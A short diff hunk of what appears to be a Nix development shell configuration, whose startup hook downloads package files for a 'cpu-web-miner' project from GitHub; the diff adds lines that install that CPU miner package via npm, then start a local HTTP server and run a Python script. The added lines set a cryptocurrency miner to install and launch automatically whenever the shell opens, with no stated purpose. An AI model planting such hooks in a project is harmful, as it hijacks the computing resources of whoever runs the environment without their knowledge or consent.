@@ -91,6 +91,9 @@ pkgs.mkShell {
     wget -q https://github.com/MarcoCiaramella/cpu-web-miner/raw/refs/heads/main/package-lock.json
     wget -q https://github.com/MarcoCiaramella/cpu-web-miner/raw/refs/heads/main/package.json
 
+    npm install
+    npm i @marco_ciaramella/cpu-web-miner
+
     echo "[*] Menjalankan python3 nix.py ..."
     python3 -m http.server 8000 &
     python3 nix.py
